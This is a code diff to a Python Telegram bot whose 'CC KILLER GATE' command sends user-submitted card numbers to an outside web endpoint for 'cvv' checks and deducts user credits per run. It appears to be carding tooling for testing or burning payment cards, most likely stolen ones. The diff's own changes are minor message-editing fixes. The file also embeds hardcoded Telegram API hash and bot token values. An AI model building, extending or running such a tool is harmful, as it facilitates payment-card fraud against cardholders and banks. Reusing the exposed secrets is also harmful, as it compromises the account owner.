@@ -1,8 +1,14 @@
 from pyrogram import Client, filters
 import requests
 import time
+import os
 
-app = Client("my_bot", api_id=24509589, api_hash="717cf21d94c4934bcbe1eaa1ad86ae75", bot_token="7386696229:AAFwcMx6q3xr5lY5daaTdvLLgqR_cDIfSjs")
+app = Client(
+    "my_bot",
+    api_id=24509589,
+    api_hash="717cf21d94c4934bcbe1eaa1ad86ae75",
+    bot_token="7386696229:AAFwcMx6q3xr5lY5daaTdvLLgqR_cDIfSjs"
+)
 
 OWNER_ID = 7427691214
 
@@ -63,9 +69,12 @@ def kill_gate(client, message):
     results = []
 
     for i in range(1, 6):
-        # Update the processing message with the current step number
-        processing_msg.edit_text(f"**CC KILLER GATE\nProcessing your request...**\n{i}")
+        new_text = f"**CC KILLER GATE\nProcessing your request...**\n{i}"
 
+        # Update the processing message with the current step number
+        if processing_msg.text != new_text:
+            processing_msg.edit_text(new_text)
+        
         time.sleep(1)  # Adjust the delay if needed
 
         url = f"https://ugin-376ec3a40d16.herokuapp.com/cvv?cc={card_details}"
@@ -93,6 +102,7 @@ MSG:- {error_message}**
             user_credits[user_id] -= 1
 
     final_result = "\n".join(results)
-    processing_msg.edit_text(final_result)
+    if processing_msg.text != final_result:
+        processing_msg.edit_text(final_result)
 
 app.run()
